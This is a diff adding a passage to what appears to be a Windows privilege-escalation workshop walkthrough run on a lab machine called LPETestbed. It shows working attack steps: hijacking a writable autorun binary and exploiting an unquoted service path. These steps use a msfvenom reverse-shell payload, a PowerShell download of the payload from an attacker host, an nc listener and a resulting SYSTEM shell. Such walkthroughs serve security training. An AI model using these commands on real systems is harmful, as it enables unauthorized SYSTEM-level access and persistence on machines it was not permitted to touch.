@@ -205,3 +205,210 @@ nt authority\system
 LPETestbed
 
 C:\Windows\system32>
+
+Next let's look at AutoRuns:
+
+From SharpUp:
+
+=== Modifiable Registry Autoruns ===
+
+  HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run : C:\Program Files\Autorun Program\program.exe
+  
+This means that we can replace the binary in that location with our malicious binary, and the next time an Administrator logs in, we will get an Administrator shell. This is an unreliable privesc and something that is more suited to persistence. We use msfvenom to generate the payload and then transfer it to the box.
+
+PS C:\Users\user\Downloads> (New-Object System.Net.WebClient).DownloadFile("http://10.22.6.122/program.exe", "C:\Program Files\Autorun Program\program.exe")
+PS C:\Users\user\Downloads> dir C:\Progra~1\"Autorun Program"
+
+
+    Directory: C:\Program Files\Autorun Program
+
+
+Mode                LastWriteTime     Length Name                                                                      
+----                -------------     ------ ----                                                                      
+-a---        12/19/2019   8:34 AM      73802 program.exe                                                               
+
+
+PS C:\Users\user\Downloads> 
+
+Now the next time an Administrator logs into the machine, we will get a shell as an administrator. This is also useful for getting persistence as mentioned above.
+
+Next let's take a look at something that will require a different privesc script (we will come back to SharpUp for some other stuff in a bit).
+
+We are going to run Seatbelt (also from GhostPack) and see what we get there.
+
+We transfer Seatbelt.exe over to the machine and see this for services: 
+=== Non Microsoft Services (via WMI) ===
+
+  Name             : daclsvc
+  DisplayName      : DACL Service
+  Company Name     : 
+  Description      : 
+  State            : Stopped
+  StartMode        : Manual
+  PathName         : C:\Users\user\Downloads\daclservicehijack.exe
+  IsDotNet         : False
+
+  Name             : dllsvc
+  DisplayName      : DLL Hijack Service
+  Company Name     : 
+  Description      : 
+  State            : Stopped
+  StartMode        : Manual
+  PathName         : "C:\Program Files\DLL Hijack Service\dllhijackservice.exe"
+  IsDotNet         : False
+
+  Name             : filepermsvc
+  DisplayName      : File Permissions Service
+  Company Name     : 
+  Description      : 
+  State            : Stopped
+  StartMode        : Manual
+  PathName         : "C:\Program Files\File Permissions Service\filepermservice.exe"
+  IsDotNet         : False
+
+  Name             : PathHijackService
+  DisplayName      : PathHijackService
+  Company Name     : 
+  Description      : 
+  State            : Running
+  StartMode        : Auto
+  PathName         : "C:\Program Files\Path Hijack\PathHijackService.exe"
+  IsDotNet         : True
+
+  Name             : regsvc
+  DisplayName      : Insecure Registry Service
+  Company Name     : 
+  Description      : 
+  State            : Stopped
+  StartMode        : Manual
+  PathName         : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
+  IsDotNet         : False
+
+  Name             : unquotedsvc
+  DisplayName      : Unquoted Path Service
+  Company Name     : 
+  Description      : 
+  State            : Stopped
+  StartMode        : Manual
+  PathName         : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+  IsDotNet         : False
+
+ These are all of the non-standard Windows Services that are installed on the machine.
+ 
+ If we look at the last one listed (ignoring the obvious name) we see that the PathName is missing quotes around the name. This can be an issue that will lead to privilege escalation IF we can control any piece of the path with a space along the way. If you do not quote the path to a service binary, Windows assumes you want to try to execute the binary at every stop along the directory path. Windows assumes you are passing arguments to a binary at the stops along the way. So the example above shows us that there are 3 stops along the way that could lead to execution. Let's take a look at this:
+ 
+ C:\Program SPACE Files\Unquoted SPACE Path Service\Common SPACE Files\unquotedpathservice.exe
+ 
+ Every place that SPACE appears, is a place that we could put a binary and hope that it gets executed. In order in the path we could put:
+ 
+ C:\Program.exe
+ C:\Program Files\Unquoted.exe
+ C:\Program Files\Unquoted Path Service\Common.exe
+ 
+ If we can write to any of these locations, we can achieve privilege escalation.
+ 
+ Let's check our permissions each step along the way:
+ 
+ First we check the root of the C:\ drive
+ 
+PS C:\Users\user\Downloads> icacls.exe C:\      
+C:\ BUILTIN\Administrators:(F)
+    BUILTIN\Administrators:(OI)(CI)(IO)(F)
+    NT AUTHORITY\SYSTEM:(F)
+    NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
+    BUILTIN\Users:(OI)(CI)(RX)
+    NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(M)
+    NT AUTHORITY\Authenticated Users:(AD)
+    Mandatory Label\High Mandatory Level:(OI)(NP)(IO)(NW)
+
+Successfully processed 1 files; Failed processing 0 files
+
+We see that we can read and execute, but we can't write.
+
+Next stop:
+PS C:\Users\user\Downloads> icacls.exe C:\Progra~1\
+C:\Progra~1\ NT SERVICE\TrustedInstaller:(F)
+             NT SERVICE\TrustedInstaller:(CI)(IO)(F)
+             NT AUTHORITY\SYSTEM:(M)
+             NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
+             BUILTIN\Administrators:(M)
+             BUILTIN\Administrators:(OI)(CI)(IO)(F)
+             BUILTIN\Users:(RX)
+             BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
+             CREATOR OWNER:(OI)(CI)(IO)(F)
+
+Successfully processed 1 files; Failed processing 0 files
+
+We can't write to the Program Files folder either.
+
+PS C:\Users\user\Downloads> icacls.exe C:\"Program Files"\"Unquoted Path Service"
+C:\Program Files\Unquoted Path Service BUILTIN\Users:(F)
+                                       NT SERVICE\TrustedInstaller:(I)(F)
+                                       NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
+                                       NT AUTHORITY\SYSTEM:(I)(F)
+                                       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
+                                       BUILTIN\Administrators:(I)(F)
+                                       BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+                                       BUILTIN\Users:(I)(RX)
+                                       BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
+                                       CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+
+Successfully processed 1 files; Failed processing 0 files
+PS C:\Users\user\Downloads> 
+
+We can however write to the Unquoted Path Service folder.
+This means that if we create an executable named Common.exe, we can get a reverse shell as NT\System the next time the service is started.
+
+So, we create the binary: 
+
+msfvenom -p windows/shell_reverse_tcp LPORT=31337 LHOST=YOURIPHERE -f exe-service > Common.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe-service file: 15872 bytes
+
+Then we start our handler to catch the reverse shell:
+
+root@kali:~/LPEWorkshop# nc -lvnp 31337
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::31337
+Ncat: Listening on 0.0.0.0:31337
+
+
+Then we transfer the binary:
+PS C:\Program Files\Unquoted Path Service> (New-Object System.Net.WebClient).DownloadFile("http://10.22.6.122/Common.exe", "C:\Program Files\Unquoted Path Service\Common.exe")
+PS C:\Program Files\Unquoted Path Service> ls
+
+
+    Directory: C:\Program Files\Unquoted Path Service
+
+
+Mode                LastWriteTime     Length Name                                                                      
+----                -------------     ------ ----                                                                      
+d----        12/17/2019  12:31 PM            Common Files                                                              
+-a---        12/19/2019   9:32 AM      15872 Common.exe                                                                
+
+
+PS C:\Program Files\Unquoted Path Service>
+
+Then we start the service:
+net start unquotedsvc
+
+Then we get a reverse shell as the NT\Authority System user:
+
+root@kali:~/LPEWorkshop# nc -lvnp 31337
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::31337
+Ncat: Listening on 0.0.0.0:31337
+Ncat: Connection from 10.22.6.49.
+Ncat: Connection from 10.22.6.49:64557.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami & hostname
+whoami & hostname
+nt authority\system
+LPETestbed
+
+C:\Windows\system32>
